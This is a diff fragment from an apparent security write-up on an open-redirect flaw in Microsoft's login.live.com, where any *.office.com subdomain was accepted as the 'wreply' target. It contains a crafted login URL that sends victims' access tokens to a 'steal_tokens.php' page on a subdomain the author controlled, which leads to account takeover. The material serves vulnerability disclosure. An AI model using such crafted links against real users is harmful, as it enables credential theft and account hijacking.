@@ -25,8 +25,8 @@ was allowing any subdomains of office.com (*.office.com) to be a valid wreply UR
 
 Since one of their subdomain was in my control, I could use the domain as a valid `wreply` url and was able to leak the access tokens:
 
-`https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1529775349&rver=6.7.6643.0
-&wp=MBI_SSL&wreply=https://success.office.com/steal_tokens.php
+`https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1529775349
+&rver=6.7.6643.0&wp=MBI_SSL&wreply=https://success.office.com/steal_tokens.php
 &lc=1033&id=292666&lw=1&fl=easi2&pcexp=true&uictx=me`
 
 Basically, if any user who has already been authenticated (or going to authenticate), "clicked" on a crafted link with the above changes, the tokens would get leaked and this token can be exchanged for a session token and subsequently an account takeover would result.
